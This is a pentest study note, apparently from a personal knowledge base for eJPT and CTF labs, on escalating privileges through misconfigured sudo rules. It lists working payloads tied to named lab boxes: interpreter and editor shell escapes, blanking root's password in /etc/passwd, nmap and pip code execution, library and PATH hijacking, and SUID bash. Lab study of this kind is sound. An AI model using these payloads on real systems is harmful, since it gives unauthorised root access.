---
type: technique
tags: [ejpt:host-net-pentest]
tools: [gtfobins]
cves: []
related: ["[[suid-enumeration]]", "[[ssh-bruteforce]]"]
---

# Sudo Abuse

Exploiting misconfigured `sudo` permissions to escalate privileges.

## Workflow

1. After any foothold, run `sudo -l` to list allowed commands and any `NOPASSWD` entries.
2. If a command can run as root (or as another user), look it up on [[gtfobins]] for an escalation payload.

## Payloads seen

- `sudo vim -c ':!/bin/sh' /dev/null` → root ([[trust]], [[obsession]], [[simple-ctf]]).
- `sudo ruby -e 'exec "/bin/sh"'` → root ([[vacaciones]], [[amor]] as `sudo -u root /usr/bin/ruby -e 'exec "/bin/bash"'`).
- `(sonic) NOPASSWD: ALL` → `sudo -u sonic ...`, then `(ALL) NOPASSWD: ALL` → `sudo su` ([[hedgehog]]).
- `sudo` group membership + `NOPASSWD: /bin/bash` → `sudo su` ([[borazuwara]]).
- `(hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img` → `debugfs: !/bin/bash` escapes to a shell as `hannah` ([[hannah-coffee]]).
- `(chocolate) NOPASSWD: /usr/bin/php` → `sudo -u chocolate php -r 'system("/bin/sh -i")'` → shell as `chocolate` ([[balulero]]).
- `(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js` → overwrite `script.js` with a shell spawn → `sudo -u root ...` → root ([[nodeclimb]]).
- `(luisillo) NOPASSWD: /usr/bin/perl` → `sudo -u luisillo perl -e 'exec "/bin/sh"'` → shell as `luisillo` ([[psycho]]).
- `(pinguinito) NOPASSWD: /usr/bin/python3` → no pinned file at all, so the payload rides in the flag: `sudo -u pinguinito /usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash")'` → shell as `pinguinito` ([[secretjenkins]]) — the lateral hop has *nothing* pinned; its root rule two steps later does, and the payload moves into the file. The same rule then appeared as a **root hop** on [[pequeñas-mentirosas]] — `(ALL) NOPASSWD: /usr/bin/python3`, identical `os.execl` payload, straight to root: an interpreter rule pins no file, so the `-c` string *is* the exploit.
- `(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py` + writable `/opt` dir → `rm /opt/paw.py` and rewrite with a shell spawn → root ([[psycho]], [[secretjenkins]] did it byte-for-byte with `mv /opt/script.py /opt/script.py.bak` + rewrite).
- `(pingu) NOPASSWD: /usr/bin/man` → `sudo -u pingu man man`, then `!/bin/bash` inside the pager → shell as `pingu` ([[anonymous-pingu]]).
- `(gladys) NOPASSWD: /usr/bin/nmap` → `nmap --script=/tmp/shell.nse` with `os.execute("/bin/sh <&1 >&1 2>&1")` → shell as `gladys` ([[anonymous-pingu]]).
- `(root) NOPASSWD: /usr/bin/chown` → take ownership of `/etc/passwd`, blank root's password → `su -` ([[anonymous-pingu]], see [[writable-etc-passwd]]).
- `(maci) NOPASSWD: /home/maci/script.sh` → script uses `[[ $num -eq 123123 ]]` → arithmetic injection `a[$(/bin/bash -p >&2)]` → shell as `maci` ([[bruteshock]], [[arithmetic-injection]]).
- `(pepe) NOPASSWD: /usr/sbin/exim` → `exim -be '${run{…}}'` runs commands as pepe ([[bruteshock]], [[exim-lpe]]).
- `(ALL) NOPASSWD: /usr/bin/dos2unix` → `dos2unix -f -n /tmp/passwd.new /etc/passwd` blanks root's password → `su -` ([[bruteshock]], [[writable-etc-passwd]]).
- `(ALL) NOPASSWD: /usr/bin/php` → `sudo -u root php -r 'system("/bin/sh -i")'` → root ([[littlepivoting]]).
- `(ALL) /usr/bin/vim` → `sudo -u root vim` then `:!/bin/bash` → root ([[littlepivoting]]).
- `(root) NOPASSWD: /usr/bin/env` → `sudo -u root env /bin/bash` → root ([[littlepivoting]]).
- `(ALL) NOPASSWD: /usr/bin/env` → `sudo /usr/bin/env /bin/sh -p` → root ([[flynn]]).
- `(hermonine) /usr/bin/pico` → `sudo -u hermonine pico`, then `^R` `^X` → `reset; sh 1>&0 2>&0` → shell as `hermonine` ([[madeyes-castle]]).
- `(ALL) NOPASSWD: ALL` → `sudo -u root /bin/bash -p` — unrestricted sudo still deserves a `sudo -l` check; there is nothing to abuse, just run the payload directly ([[analyst]]).
- `(ALL : ALL) /usr/bin/file` → **arbitrary root file read**, not a shell: `sudo -u root /usr/bin/file -f /opt/password.txt` treats each line of the file as a filename and echoes it back in the error output (``root:rooteable2: cannot open …``) → root's password → `su root` ([[dance-samba]], [[gtfobins]]). GTFOBins has a *file-read* section too — check it even when the binary can't spawn a shell.
- `(norberto) NOPASSWD: /usr/bin/baner` → a **custom** binary (not in GTFOBins) that runs `head` by *name*: absolute path first, then relative — so the payload is a [[path-hijacking]] (`PATH=/tmp:$PATH` + `/tmp/head`), not a GTFOBins one-liner. When the binary's own output says it's calling something relatively, it's telling you the vulnerability ([[rutas]]).
- `(julen) NOPASSWD: /usr/bin/awk` → `sudo -u julen /usr/bin/awk 'BEGIN {system("/bin/sh")}'` → shell as `julen` ([[file]]).
- `(iker) NOPASSWD: /usr/bin/env` → `sudo -u iker /usr/bin/env /bin/bash` → shell as `iker` ([[file]]).
- `(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py` → the command line is **pinned**, so you can't touch the arguments — overwrite the *script* it runs with `import os; os.execl("/bin/sh", "sh")` → root ([[file]], same shape as [[nodeclimb]]/[[psycho]]: when the payload must be an argument you can't change, move it into the file the command reads).
- `(root) NOPASSWD: /usr/bin/grep` + `/usr/bin/cut` → **root file read**: `sudo -u root /usr/bin/grep '' /root/clave.txt` — the empty pattern matches every line, so grep *prints the file* → root's password → `su -`. `cut` is the untested twin in the same rule (`cut -c1- file`). Same family as dance-samba's `file -f`, one tool over ([[dockerlabs-box]]).
- `(ALL : ALL) NOPASSWD: /usr/local/bin/bash` → the allowed path is a **custom wrapper script** (not a GTFOBins binary) that executes `/opt/bash.sh`; with `/opt` writable, replace the *callee* with `chmod 4755 /bin/bash`, run the wrapper, then `/bin/bash -p` → root ([[jenkhack]]). The chain is absolute — no [[path-hijacking]] involved — so the payload goes in the file the wrapper calls, not in an argument or a `PATH` entry.
- `(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py` → the pinned script is read-only, but its **import is the attack surface**: `/opt` itself is carlos-owned, so drop `/opt/shutil.py` shadowing the script's `import shutil` → root ([[library]], [[python-library-hijacking]]). Contrast [[file]]/[[psycho]], where the script itself was writable and got overwritten instead — ownership of the *directory* is a separate check from ownership of the file.
- `(ALL) NOPASSWD: /usr/bin/pip3 install *` → **the wildcard is the vulnerability**: nothing is pinned, so *you* pick the directory — write a `setup.py` whose top level runs `os.system("exec /bin/sh …")`, `cd` into it, `sudo pip3 install .` → pip executes `setup.py` during install → root ([[pkgpoison]], [[gtfobins]]). A package manager is an interpreter with extra steps: `install` means *run this project's code*. This is the unpinned opposite of the pinned-script bullets above — when the rule has no file argument, the payload doesn't need one.
- `(vilma) NOPASSWD: /usr/bin/ash` → **no payload at all — the allowed binary is already a shell.** When sudo pins a shell (`ash`, `sh`, `bash`, `zsh`), running it *is* the exploit: `sudo -u vilma /usr/bin/ash` → shell as vilma. GTFOBins has no entry for it because there's nothing to look up ([[elevator]]).
- `(fred) NOPASSWD: /usr/bin/lua` → `sudo -u fred /usr/bin/lua -e 'os.execute("/bin/bash")'` → shell as fred — same shape as ruby/perl/python, one more language on the list ([[elevator]], [[gtfobins]]).
- `(scooby) NOPASSWD: /usr/bin/gcc` → `sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s x` → shell as scooby. The `-wrapper` flag tells gcc to run *another program* as its driver — so bash drives, and `-s x` gives it a file to swallow. **Compilers are GTFOBins citizens too** — check the development section, not just the shells ([[elevator]]).
- `(root) NOPASSWD: /usr/bin/sudo` → **sudo itself is the allowed binary**, so `sudo -u root sudo su` — there is no privilege left to separate: the recursion lands directly at root. When the rule names sudo, you're root with extra steps ([[elevator]], cf. [[hedgehog]]'s `(ALL) NOPASSWD: ALL`).

## Re-run `sudo -l` after every hop

The entry you need is usually on the account you *just became*, not the one you started with. [[file]] carried three rules on three different users — `awk` on mario, `env` on julen, `python3` on iker — so `sudo -l` after each `su` was what revealed the next step. A single `sudo -l` at the foothold reads as "nothing useful" on a box like this.

[[elevator]] is the extreme case: **six rules on six users**, one binary per floor (www-data → daphne → vilma → shaggy → fred → scooby → root). The foothold's `sudo -l` showed exactly one of the six — hop 1 — and every subsequent rule appeared only after the hop that unlocked it. The chain *is* the enumeration: `sudo -l`, escalate, `sudo -l`, escalate.

## Seen in

[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[analyst]], [[dance-samba]], [[rutas]], [[file]], [[dockerlabs-box]], [[jenkhack]], [[library]], [[secretjenkins]], [[amor]], [[pkgpoison]], [[elevator]], [[pequeñas-mentirosas]]
